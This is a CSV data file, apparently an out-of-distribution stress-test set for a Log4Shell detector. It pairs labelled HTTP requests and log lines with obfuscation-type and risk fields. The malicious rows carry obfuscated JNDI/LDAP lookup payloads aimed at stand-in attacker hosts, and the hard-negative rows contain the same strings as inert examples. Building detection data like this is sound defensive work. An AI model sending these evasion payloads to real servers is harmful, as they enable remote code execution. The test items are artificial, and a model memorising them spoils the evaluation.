id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
OOD-900057,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}&request_id=ood-900057 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://log4j-test.invalid/unsupported-namespace}&request_id=ood-900057 http/1.1 host: victim.local,1,log4shell,unsupported_lookup_namespace,query,ood_stress_test,critical
OOD-900048,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}; sid=ood900048,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}; sid=ood900048,1,log4shell,protocol_fragment_sys_lookup,cookie,ood_stress_test,critical
OOD-900106,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}"",""host"":""probe.example.net""}",1,log4shell,unsupported_lookup_namespace,json,ood_stress_test,critical
OOD-900027,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.27 | X-Api-Version: %u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fpercent-u%u007D,request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.27 | x-api-version: %u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fpercent-u%u007d,1,log4shell,iis_percent_u_encoding,header,ood_stress_test,critical
OOD-900231,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup trace_id=benign-ood-900231,info tutorial says type ${ then jndi then :ldap://callback.local separately; not a runtime lookup trace_id=benign-ood-900231,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900281,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only,warn unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900111,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.111 | X-Api-Version: ${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://probe.example.net/date-fragment},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.111 | x-api-version: ${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://probe.example.net/date-fragment},1,log4shell,date_lookup_reconstruction,header,ood_stress_test,critical
OOD-900044,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}; sid=ood900044,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}; sid=ood900044,1,log4shell,charcode_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900122,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fpercent-u%u007D"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fpercent-u%u007d"",""host"":""lab-callback.example.org""}",1,log4shell,iis_percent_u_encoding,json,ood_stress_test,critical
OOD-900194,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900194,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900194,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900134,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://lab-callback.example.org/date-fragment}"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://lab-callback.example.org/date-fragment}"",""host"":""lab-callback.example.org""}",1,log4shell,date_lookup_reconstruction,json,ood_stress_test,critical
OOD-900227,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation trace_id=benign-ood-900227","info rendered json string value=""\\${jndi:ldap://callback.local/not-executed}"" source=documentation trace_id=benign-ood-900227",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900045,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}&request_id=ood-900045 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://attacker.evil.com/protocol-sys}&request_id=ood-900045 http/1.1 host: victim.local,1,log4shell,protocol_fragment_sys_lookup,query,ood_stress_test,critical
OOD-900236,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only trace_id=benign-ood-900236,warn unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only trace_id=benign-ood-900236,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900208,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900208,info tutorial says type ${ then jndi then :ldap://log4j-test.invalid separately; not a runtime lookup trace_id=benign-ood-900208,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900186,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only trace_id=benign-ood-900186,warn unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only trace_id=benign-ood-900186,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900102,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}"",""host"":""probe.example.net""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}"",""host"":""probe.example.net""}",1,log4shell,sys_lookup_separator,json,ood_stress_test,critical
OOD-900004,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fpercent-u%u007D; sid=ood900004,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fpercent-u%u007d; sid=ood900004,1,log4shell,iis_percent_u_encoding,cookie,ood_stress_test,critical
OOD-900158,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup trace_id=benign-ood-900158,info tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup trace_id=benign-ood-900158,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900138,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}"",""host"":""lab-callback.example.org""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode}"",""host"":""lab-callback.example.org""}",1,log4shell,charcode_lookup_reconstruction,json,ood_stress_test,critical
OOD-900103,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.103 | X-Api-Version: ${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.103 | x-api-version: ${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator},1,log4shell,sys_lookup_separator,header,ood_stress_test,critical
OOD-900119,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.119 | X-Api-Version: ${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.119 | x-api-version: ${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys},1,log4shell,protocol_fragment_sys_lookup,header,ood_stress_test,critical
OOD-900268,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900268,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900268,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900041,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}&request_id=ood-900041 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}&request_id=ood-900041 http/1.1 host: victim.local,1,log4shell,charcode_lookup_reconstruction,query,ood_stress_test,critical
OOD-900187,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only trace_id=benign-ood-900187,warn unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only trace_id=benign-ood-900187,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900216,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900216,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1 trace_id=benign-ood-900216,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900161,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only,warn unit-test fixture expected='${jndi:ldap://evil.example/fixture}' assertion=string_literal_only,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900213,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flog4j-test.invalid%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://log4j-test.invalid/research}&intent=research http/1.1,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900013,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://evil.example/date-fragment}&request_id=ood-900013 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://evil.example/date-fragment}&request_id=ood-900013 http/1.1 host: victim.local,1,log4shell,date_lookup_reconstruction,query,ood_stress_test,critical
OOD-900271,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900271,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900271,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900082,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace}"",""host"":""callback.local""}",1,log4shell,unsupported_lookup_namespace,json,ood_stress_test,critical
OOD-900220,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900220,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900220,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900183,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup trace_id=benign-ood-900183,info tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup trace_id=benign-ood-900183,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900040,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://attacker.evil.com/date-fragment}; sid=ood900040,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://attacker.evil.com/date-fragment}; sid=ood900040,1,log4shell,date_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900288,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Flab-callback.example.org%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900288,get /search?q=${jndi:ldap://lab-callback.example.org/research}&intent=research http/1.1 trace_id=benign-ood-900288,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900080,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}; sid=ood900080,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}; sid=ood900080,1,log4shell,sys_lookup_separator,cookie,ood_stress_test,critical
OOD-900024,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}; sid=ood900024,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${jndi:l${sys:user.name:-d}ap://evil.example/protocol-sys}; sid=ood900024,1,log4shell,protocol_fragment_sys_lookup,cookie,ood_stress_test,critical
OOD-900133,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://lab-callback.example.org/date-fragment}&request_id=ood-900133 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://lab-callback.example.org/date-fragment}&request_id=ood-900133 http/1.1 host: victim.local,1,log4shell,date_lookup_reconstruction,query,ood_stress_test,critical
OOD-900248,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900248,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900248,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
